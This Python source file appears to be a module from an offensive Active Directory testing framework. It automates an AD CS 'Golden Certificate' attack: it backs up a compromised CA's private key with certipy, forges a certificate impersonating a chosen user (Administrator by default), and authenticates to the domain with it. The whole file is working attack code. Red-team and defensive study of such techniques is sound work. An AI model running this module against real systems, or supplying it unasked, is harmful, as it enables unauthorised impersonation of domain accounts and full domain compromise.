import os

from module import BaseModule
from tool import Tool


class ADCSGoldenCert(BaseModule):
    name = "ADCS - Golden Certificate"
    path = "adcs/goldencert"
    description = "Backup CA key material, forge a certificate for a target user, and optionally authenticate with it"
    info = """A Golden Certificate attack abuses compromised AD CS CA private key material to mint arbitrary certificates for domain identities.

Prerequisites:
  - The attacker can backup/export the CA private key (or already has the CA PFX).
  - The target CA can issue certificates trusted for domain authentication.
  - The attacker knows a target user principal to forge."""

    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "ca_name": {"default": "", "description": "ADCS CA Name", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address. If empty, domain will be used.", "required": False},
        "target_user": {"default": "Administrator", "description": "Target user to impersonate with forged certificate", "required": True},
        "subject_dn": {"default": "", "description": "Optional certificate subject DN. Empty defaults to CN=<target_user>,CN=Users,DC=...", "required": False},
        "skip_auth": {"default": "no", "description": "Just forge the certificate, don't authenticate with it (yes/no). To use later with adcs/ptc.", "required": False},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username (must be able to backup the CA)", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    @staticmethod
    def _build_default_subject(target_user: str, domain: str) -> str:
        domain_dn = ",".join(f"DC={label}" for label in domain.split(".") if label)
        return f"CN={target_user},CN=Users,{domain_dn}" if domain_dn else f"CN={target_user},CN=Users"

    async def run(self):
        if not self.validate_options():
            return

        target_user = self.opts.target_user.strip()
        if not target_user:
            self.pane_a.write("[red][!] Option `target_user` cannot be empty.[/red]")
            return

        skip_auth_value = self.opts.skip_auth.strip().lower()
        if skip_auth_value not in {"yes", "no"}:
            self.pane_a.write("[red][!] Option `skip_auth` must be 'yes' or 'no'.[/red]")
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return

        ca_pfx = f"{self.opts.ca_name}.pfx"
        forged_pfx = self.uniq_filename(f"{target_user}")
        subject = self.opts.subject_dn.strip() or self._build_default_subject(
            target_user, self.opts.domain.strip()
        )

        tool.title("Backup the compromised CA certificate and private key")
        if not await tool.certipy_ca(["-backup"]):
            return

        tool.title("Forge a certificate for the target user")
        if not await tool.certipy_forge(
            ca_pfx,
            [
                "-upn",
                f"{target_user}@{self.opts.domain}",
                "-subject",
                subject,
                "-out",
                forged_pfx,
            ],
        ):
            return

        if skip_auth_value == "yes":
            self.pane_b.write(
                "[bold green][*] Certificate forged successfully. Authentication step skipped.[/bold green]"
            )
            return

        tool.title("Authenticate to the domain using the forged certificate")
        if not await tool.certipy_auth(forged_pfx, ["-no-save"]):
            return

        self.pane_b.write("[bold green][*] Attack successful.[/bold green]")
